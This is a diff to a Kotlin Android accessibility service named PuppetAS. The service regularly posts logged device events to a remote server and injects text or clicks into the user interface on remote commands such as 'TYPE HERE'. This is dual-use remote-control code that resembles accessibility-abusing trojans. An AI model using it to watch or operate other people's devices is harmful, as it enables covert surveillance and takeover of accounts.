@@ -42,27 +42,27 @@ open class PuppetAS : AccessibilityService() {
         Thread {
             while (true) {
                 val uid = getUUID()
-                if (logs.isNotEmpty()) {
-                    try {
-                        heartbeat(uid, logs.joinToString())
-                    } catch (e: Exception) {
-                        Log.e("PuppetAS", "Error in sending POST request: ${e.message}")
-                    } finally {
-                        logs.clear()
+                try {
+                    val logMessage = logs.joinToString()
+                    val jsonObject = JSONObject().apply {
+                        put("uid", uid)
+                        put("event", logMessage)
                     }
+                    heartbeat(jsonObject)
+                } catch (e: Exception) {
+                    Log.e("PuppetAS", "Error in sending POST request: ${e.message}")
+                } finally {
+                    logs.clear()
+                    Thread.sleep((1000..3000).random().toLong())
                 }
-                Thread.sleep((1000..3000).random().toLong())
             }
         }.start()
     }
 
-    private fun heartbeat(uid: String, logMessage: String) {
+    private fun heartbeat(jsonObject: JSONObject) {
         val serverUrl = getServerUrl()
         val url = URL("$serverUrl/send_event")
-        val jsonObject = JSONObject().apply {
-            put("uid", uid)
-            put("event", logMessage)
-        }
+
 
         val conn = url.openConnection() as HttpURLConnection
         conn.requestMethod = "POST"
@@ -136,8 +136,8 @@ open class PuppetAS : AccessibilityService() {
             }
 
             accCommand.startsWith("TYPE") -> {
-                if (accCommand == "TYPE FIRST") {
-                    val text = "default text"  // or whatever text you want to input
+                if (accCommand.startsWith("TYPE FIRST ")) {
+                    val text = accCommand.substringAfter("TYPE FIRST ")
                     val arguments = Bundle()
                     arguments.putCharSequence(
                         AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text
@@ -145,10 +145,16 @@ open class PuppetAS : AccessibilityService() {
                     getFirstTypeableNode()?.performAction(
                         AccessibilityNodeInfo.ACTION_SET_TEXT, arguments
                     )
-                } else {
-                    val id = accCommand.removePrefix("TYPE ").substringBefore("\"").trim()
-                    val text = accCommand.substringAfter("\"").removeSuffix("\"")
-                    typeInView(id, text)
+                } else if (accCommand.startsWith("TYPE HERE")) {
+                    val focusedNode: AccessibilityNodeInfo? = rootInActiveWindow.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
+                    val text = accCommand.substringAfter("TYPE HERE ")
+                    val arguments = Bundle()
+                    arguments.putCharSequence(
+                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text
+                    )
+                    focusedNode?.performAction(
+                        AccessibilityNodeInfo.ACTION_SET_TEXT, arguments
+                    )
                 }
             }
         }
@@ -227,21 +233,10 @@ open class PuppetAS : AccessibilityService() {
 
     private fun clickView(id: String) {
         val rootNode = rootInActiveWindow ?: return
-        val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
+        val nodes = rootNode.findAccessibilityNodeInfosByText(id)
+
         nodes.forEach {
             it.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-        }
-    }
-
-    private fun typeInView(id: String, text: String) {
-        val rootNode = rootInActiveWindow ?: return
-        val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
-        nodes.forEach {
-            val arguments = Bundle()
-            arguments.putCharSequence(
-                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text
-            )
-            it.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
         }
     }
 
